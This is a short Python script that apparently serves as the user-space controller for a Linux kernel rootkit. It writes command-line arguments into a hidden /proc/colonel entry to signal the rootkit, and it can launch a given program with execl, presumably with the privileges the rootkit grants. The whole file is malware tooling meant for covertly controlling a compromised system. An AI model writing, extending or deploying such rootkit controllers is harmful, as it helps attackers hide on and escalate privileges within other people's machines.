#!/usr/bin/env python

# Sends commands passed through the command line to the rootkit.
from sys import argv
from os import getpid, execl

def command(c):
	f = open("/proc/colonel", "w")
	f.write(c)
	f.close()

if len(argv[:]) <= 1:
	print "USAGE: %s <command>" % argv[0]
elif len(argv[:]) > 2:
	execl(argv[2], "")
elif len(argv[:]) > 1:
	command(argv[1])
